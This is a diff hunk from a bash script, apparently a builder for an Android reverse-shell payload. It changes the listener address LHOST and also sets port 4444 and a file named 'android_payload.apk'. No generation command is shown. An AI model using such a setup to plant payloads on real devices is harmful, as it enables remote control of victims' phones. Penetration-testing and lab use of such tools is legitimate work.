@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # معلومات الاتصال
-LHOST="192.168.1.9"
+LHOST="192.168.1.16"
 LPORT="4444"
 APK_NAME="android_payload.apk"
 
